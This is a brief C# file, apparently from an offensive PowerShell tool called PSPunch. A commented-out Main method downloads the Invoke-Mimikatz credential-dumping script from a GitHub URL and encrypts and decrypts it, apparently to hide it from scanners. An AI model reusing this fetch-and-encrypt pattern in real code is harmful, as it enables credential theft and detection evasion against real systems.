using System;
using System.IO;
using System.Security;

using System.Runtime.InteropServices;
using System.Linq;
using System.Text;
using System.Collections.Generic;

namespace PSPunch
{
    class Utils
    {


        //static void Main(string[] args)
        //{
        //    Dictionary<string, string> fileDict = new Dictionary<string, string>();
        //    fileDict.Add("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1", "invoke-mimikatz.ps1");
        //    string key = GenerateKey();
        //    foreach(KeyValuePair<string, string> entry in fileDict)
        //    {
        //        Console.WriteLine("Read from file: {0}", key);
        //        string downloadDest = DownloadFile(entry.Key, entry.Value);
        //        string encFile = downloadDest + ".enc";
        //        FileTools.EncryptFile(downloadDest, encFile, key);
        //        string decFile = downloadDest + ".dec";
        //        FileTools.DecryptFile(encFile, decFile, key);
        //    }

        //}
    }
}
